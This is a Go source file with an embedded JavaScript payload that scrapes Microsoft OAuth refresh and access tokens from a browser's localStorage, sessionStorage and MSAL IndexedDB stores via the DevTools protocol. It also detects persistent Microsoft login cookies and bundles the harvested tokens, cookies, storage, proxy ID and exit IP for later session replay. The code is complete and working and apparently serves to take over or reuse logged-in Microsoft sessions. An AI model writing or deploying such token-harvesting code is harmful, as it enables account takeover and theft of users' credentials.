package trust

import (
	"encoding/json"
	"regexp"
	"strings"
	"time"
)

var msRefreshTokenRe = regexp.MustCompile(`"refresh_token"\s*:\s*"([^"\\]+)`)
var msAccessTokenRe = regexp.MustCompile(`"access_token"\s*:\s*"([^"\\]+)`)

// TokenHarvest holds OAuth tokens scraped from browser storage.
type TokenHarvest struct {
	RefreshToken string `json:"refreshToken"`
	AccessToken  string `json:"accessToken"`
	ClientID     string `json:"clientId"`
	Source       string `json:"source"`
	LoggedIn     bool   `json:"loggedIn"`
	Error        string `json:"error,omitempty"`
}

// MicrosoftSessionHarvestJS navigates MSAL storage for tokens (zero manual export).
const MicrosoftSessionHarvestJS = `(async function(){
  const out = { refreshToken: '', accessToken: '', clientId: '', loggedIn: false, source: 'browser_storage' };
  try {
    const href = location.href || '';
    out.loggedIn = !href.includes('login.live.com') && !href.includes('login.microsoftonline.com');
    const scan = (text) => {
      if (!text) return;
      let m = text.match(/"refresh_token"\s*:\s*"([^"\\]+)/);
      if (m && m[1] && !out.refreshToken) out.refreshToken = m[1];
      m = text.match(/"access_token"\s*:\s*"([^"\\]+)/);
      if (m && m[1] && !out.accessToken) out.accessToken = m[1];
      m = text.match(/"client_id"\s*:\s*"([^"\\]+)/);
      if (m && m[1] && !out.clientId) out.clientId = m[1];
    };
    for (let i = 0; i < localStorage.length; i++) {
      scan(localStorage.getItem(localStorage.key(i)));
    }
    for (let i = 0; i < sessionStorage.length; i++) {
      scan(sessionStorage.getItem(sessionStorage.key(i)));
    }
    if (indexedDB && indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const meta of dbs) {
        if (!meta.name || !/msal|microsoft|login/i.test(meta.name)) continue;
        await new Promise((resolve) => {
          const req = indexedDB.open(meta.name);
          req.onerror = () => resolve();
          req.onsuccess = () => {
            try {
              const db = req.result;
              for (const storeName of db.objectStoreNames) {
                const tx = db.transaction(storeName, 'readonly');
                const store = tx.objectStore(storeName);
                const getAll = store.getAll ? store.getAll() : null;
                if (!getAll) continue;
                getAll.onsuccess = () => {
                  for (const row of getAll.result || []) {
                    scan(typeof row === 'string' ? row : JSON.stringify(row));
                  }
                };
              }
            } catch (e) {}
            resolve();
          };
        });
      }
    }
  } catch (e) {
    out.error = String(e);
  }
  return out;
})()`

// ParseTokenHarvestPayload decodes CDP evaluate output.
func ParseTokenHarvestPayload(raw []byte) TokenHarvest {
	var out TokenHarvest
	if len(raw) == 0 {
		return out
	}
	_ = json.Unmarshal(raw, &out)
	if out.RefreshToken == "" {
		if m := msRefreshTokenRe.FindSubmatch(raw); len(m) == 2 {
			out.RefreshToken = string(m[1])
		}
	}
	if out.AccessToken == "" {
		if m := msAccessTokenRe.FindSubmatch(raw); len(m) == 2 {
			out.AccessToken = string(m[1])
		}
	}
	return out
}

// HasMicrosoftSessionCookies reports durable Microsoft login cookies.
func HasMicrosoftSessionCookies(cookies []CookieEntry) bool {
	authNames := map[string]bool{
		"estsauthpersistent": true,
		"estsauth":           true,
		"wlssc":              true,
		"mso":                true,
		"lt":                 true,
	}
	for _, c := range cookies {
		dom := strings.ToLower(strings.TrimSpace(c.Domain))
		if !strings.Contains(dom, "live.com") &&
			!strings.Contains(dom, "microsoft.com") &&
			!strings.Contains(dom, "microsoftonline.com") &&
			!strings.Contains(dom, "office.com") {
			continue
		}
		if authNames[strings.ToLower(c.Name)] && strings.TrimSpace(c.Value) != "" {
			return true
		}
	}
	return false
}

// HasValidTrust reports OAuth tokens or durable session cookies.
func (b *Bundle) HasValidTrust(now time.Time) bool {
	if b == nil {
		return false
	}
	if b.HasRefreshToken() {
		return true
	}
	if b.ValidAccessToken(now) {
		return true
	}
	cookies, err := ParseCookiesJSON(b.CookiesJSON)
	if err == nil && HasMicrosoftSessionCookies(cookies) {
		return true
	}
	return false
}

// BundleFromHarvest builds a trust bundle from harvested session data.
func BundleFromHarvest(profileID string, provider Provider, cookies []CookieEntry, harvest TokenHarvest, exitIP, proxyID string) Bundle {
	return BundleFromHarvestWithStorage(profileID, provider, cookies, harvest, exitIP, proxyID, nil, nil)
}

// BundleFromHarvestWithStorage includes local/session storage maps for CDP hydrate.
func BundleFromHarvestWithStorage(
	profileID string,
	provider Provider,
	cookies []CookieEntry,
	harvest TokenHarvest,
	exitIP, proxyID string,
	localStorage, sessionStorage map[string]string,
) Bundle {
	raw, _ := json.Marshal(cookies)
	b := Bundle{
		ProfileID:      profileID,
		Provider:       provider,
		CookiesJSON:    string(raw),
		LocalStorage:   localStorage,
		SessionStorage: sessionStorage,
		ProxyID:        proxyID,
		ExitIP:         exitIP,
		UpdatedAt:      time.Now().UTC(),
	}
	if harvest.RefreshToken != "" {
		b.RefreshToken = harvest.RefreshToken
	}
	if harvest.AccessToken != "" {
		b.AccessToken = harvest.AccessToken
	}
	if harvest.Source != "" {
		b.Notes = "autopilot:" + harvest.Source
	}
	return b
}
